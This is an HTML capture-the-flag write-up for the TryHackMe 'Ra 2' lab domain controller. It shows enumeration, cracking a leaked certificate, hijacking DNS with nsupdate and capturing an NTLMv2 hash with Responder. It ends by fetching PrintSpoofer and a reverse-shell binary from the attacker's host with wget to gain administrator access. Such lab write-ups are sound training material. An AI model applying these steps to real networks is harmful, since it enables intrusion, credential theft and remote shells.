<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ra 2</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ra 2</h1><br/><p><strong><h1>THM: Ra 2</h1></strong></p><p></p><p></p><p><strong><h3>Enumeration</h3></strong></p><p></p><p><strong><span style="text-decoration:underline;">Rustscan &amp; Nmap</span></strong></p><p></p><p>We get the ports using <strong>rustscan</strong> &amp; save it to a variable named <strong>ports</strong></p><p></p><p><strong>rustscan -g -a 10.10.194.219</strong></p><p></p><p><img src="images/59-1.png" alt="images/59-1.png" /></p><p></p><p>Then, i use the <strong>ports</strong> variable in nmap.</p><p></p><p><img src="images/59-2.png" alt="images/59-2.png" /></p><p></p><p>The nmap results were pretty lengthy. Judging by the ports that are open like LDAP/S, DNS, etc I think it’s safe to assume this is a domain controller. If you’ve done Ra you’ll also notice the fire hostname looks familiar. We also find a few more hostnames:</p><p></p><p><strong>    fire.windcorp.thm</strong></p><p><strong>    selfservice.windcorp.thm</strong></p><p><strong>    selfservice.dev.windcorp.thm</strong></p><p></p><p>Let’s add these to our <strong>/etc/hosts</strong>.</p><p></p><p><strong><span style="text-decoration:underline;">DNS Enumeration</span></strong></p><p></p><p><strong>dig windcorp.thm any @10.10.194.219</strong></p><p></p><p><img src="images/59-3.png" alt="images/59-3.png" /></p><p></p><p>We indeed get our First flag here.</p><p></p><p><strong>Important:</strong></p><p>Allowing unsecured dynamic DNS updates gives any computer regardless of being joined to the domain or not, the ability to modify or create DNS records.</p><p></p><p><strong><span style="text-decoration:underline;">Nikito Enumeration</span></strong></p><p></p><p><strong>nikto --url http://10.10.194.219</strong> </p><p></p><p><img src="images/59-4.png" alt="images/59-4.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Website Enumeration</span></strong></p><p></p><p></p><p><img src="images/59-5.png" alt="images/59-5.png" /></p><p></p><p>The website has not special endpoints. However, there is a button pointint to <strong>“Selfservice”</strong>. Since we have already added the same to the hosts file we can open it for further enumeration.</p><p></p><p><strong><span style="text-decoration:underline;">Directory Enumeration</span></strong></p><p></p><p>We can use <strong>gobuster</strong> with <strong>-k</strong> option to ignore the SSL errors [Else it won&#39;t run] or we can use <strong>dirsearch</strong></p><p></p><p>Dirsearch has more cleaner output. Using Dirsearch we find the following end points.</p><p></p><p><strong>dirsearch -u https://fire.windcorp.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x 400</strong></p><p></p><p><img src="images/59-6.png" alt="images/59-6.png" /></p><p></p><p>The intresting Directory to notice is <strong>/powershell</strong>.</p><p></p><p>Upon opening the endpoint we end up with the following page.</p><p></p><p><img src="images/59-7.png" alt="images/59-7.png" /></p><p></p><p>we do not have a set of credentials as of now. We will return to this page when we have one.</p><p></p><p><strong><span style="text-decoration:underline;">Subdomain Enumeration</span></strong></p><p></p><p><strong>selfservice.windcorp.thm</strong></p><p></p><p>When we open the subdomain using the link in the homepage, we are asked for password.</p><p></p><p><img src="images/59-8.png" alt="images/59-8.png" /></p><p></p><p></p><p>Intercepting the requests in burp we see the NTLMSSP challenge response. Decoding the base64 doesn’t leak anything we don’t already know like a new hostname.</p><p></p><p><img src="images/59-9.png" alt="images/59-9.png" /></p><p></p><p></p><p><strong>selfservice.dev.windcorp.thm</strong></p><p></p><p><img src="images/59-10.png" alt="images/59-10.png" /></p><p></p><p>Opening the <strong>dev</strong> subdomain brings us to the above page.</p><p>However, doing directory enumeration here, we find an intresting endpoint.</p><p></p><p><strong>dirsearch -u https://selfservice.dev.windcorp.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x 400</strong></p><p></p><p><img src="images/59-11.png" alt="images/59-11.png" /></p><p></p><p>We open the<strong> /backup </strong>directory to find certificate files.</p><p></p><p><img src="images/59-12.png" alt="images/59-12.png" /></p><p></p><p>I got both the files into my kali machine &amp; started further enumeration on them.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Enumerating Aquired FIles</span></strong></p><p></p><p>The <strong>web.config</strong> file has no important information.</p><p></p><p>Windows servers use <strong>.pfx</strong> files that contain a public key file and the associated private key file. Let’s use <strong>pfx2john</strong>.</p><p>Then, we will use <strong>john</strong> to crack it.</p><p></p><p></p><p><strong>pfx2john cert.pfx &gt; john_pfx_hash</strong></p><p></p><p><strong>john --wordlist=/usr/share/wordlists/rockyou.txt john_pfx_hash</strong></p><p></p><p><img src="images/59-13.png" alt="images/59-13.png" /></p><p></p><p>We find the password for the <strong>cert.pfx</strong> file.</p><p></p><p>Now we can create a public and private key with openssl using cert.pfx and the password we cracked with john.</p><p></p><p><span style="text-decoration:underline;">Private Key:</span></p><p><strong>openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes</strong></p><p></p><p><span style="text-decoration:underline;">Public Key:</span></p><p><strong>openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys</strong></p><p></p><p><img src="images/59-14.png" alt="images/59-14.png" /></p><p></p><p>we got the certificates.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">DNS Manipulation</span></strong></p><p></p><p>Since we know we can update DNS records without our machine being joined to the domain we’ll use <strong>nsupdate</strong>. </p><p></p><p>Let’s send a request to delete the existing A record for <strong>selfservice.windcorp.thm</strong> and then send an update add request for a new A record to have selfservice resolve to our <strong>THM IP</strong>.</p><p></p><p></p><p><strong>nsupdate</strong></p><p><strong>&gt; server 10.10.194.219</strong></p><p><strong>&gt; update delete selfservice.windcorp.thm</strong></p><p><strong>&gt; send</strong></p><p><strong>&gt; update add selfservice.windcorp.thm 1234 A 10.11.72.31</strong></p><p><strong>&gt; send</strong></p><p><strong>&gt; quit</strong></p><p></p><p><img src="images/59-15.png" alt="images/59-15.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Testing Our Changes in DNS</span></strong></p><p></p><p>Let’s query the DNS server to see if selfservice.windcorp.thm will now resolve to our THM IP when a client requests a lookup. </p><p></p><p><strong>dig selfservice.windcorp.thm @10.10.194.219</strong></p><p></p><p><img src="images/59-16.png" alt="images/59-16.png" /></p><p></p><p>As we can see, the domain now points to our THM IP.</p><p></p><p>Next, we will host the certificate files using <strong>Responder</strong> &amp; run it to catch any requests to<strong> selfservice.windcorp.thm </strong></p><p></p><p><strong><span style="text-decoration:underline;">Responder</span></strong></p><p></p><p><img src="images/59-17.png" alt="images/59-17.png" /></p><p></p><p>We first copy the certificates to the responders certificate directory.</p><p>We then edit the responder&#39;s config for HTTPS Server to include our certificate.</p><p></p><p><strong>/etc/responder/Responder.conf  </strong></p><p></p><p>We will change the following under HTTPS Server section.</p><p></p><p><img src="images/59-18.png" alt="images/59-18.png" /></p><p></p><p></p><p>Then, we start the Responder on our THM Tunnel Interface &amp; wait for any user making request to catch his/her response.</p><p></p><p><strong>responder -I tun0</strong></p><p></p><p>After a while, we find the NTLM hash of an user.</p><p></p><p><img src="images/59-19.png" alt="images/59-19.png" /></p><p></p><p></p><p>Next, we copy the entire NTLMv2 Hash to a file &amp; crack the hash using <strong>john</strong></p><p></p><p><img src="images/59-20.png" alt="images/59-20.png" /></p><p></p><p><strong>john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2_hash</strong></p><p></p><p><strong>Credentials Found:</strong></p><p></p><p>Username: edwardle</p><p>Password: !Angelus25!</p><p></p><p></p><p><strong><h3>Foothold</h3></strong></p><p></p><p>We will now use the Powershell directory we found to login using the above credentials. (Use Computer Name as <strong>FIRE</strong>)</p><p></p><p><strong>https://fire.windcorp.thm/powershell</strong> </p><p></p><p><img src="images/59-21.png" alt="images/59-21.png" /></p><p></p><p>We find the user flag in edwardle user&#39;s desktop.</p><p></p><p><strong><h3>Privilege Escalation</h3></strong></p><p></p><p><img src="images/59-22.png" alt="images/59-22.png" /></p><p></p><p>I find that <strong>SeImpersonatePrivilege</strong> is active. Thus, we can use <strong>printspoofer</strong>.</p><p></p><p></p><p><strong>wget http://10.11.72.31/PrintSpoofer64.exe -o PrintSpoofer64.exe</strong></p><p><strong>wget http://10.11.72.31/rshell.exe -o rshell.exe</strong></p><p></p><p>Run The Printspoofer using</p><p></p><p><strong>./PrintSpoofer64.exe -c rshell.exe</strong></p><p></p><p><img src="images/59-23.png" alt="images/59-23.png" /></p><p></p><p>Start a listner &amp; get the root flag in the administator&#39;s desktop.</p><p></p><p><img src="images/59-24.png" alt="images/59-24.png" /></p><p></p><p>Thanks !!</p></div>
</body>
</html>
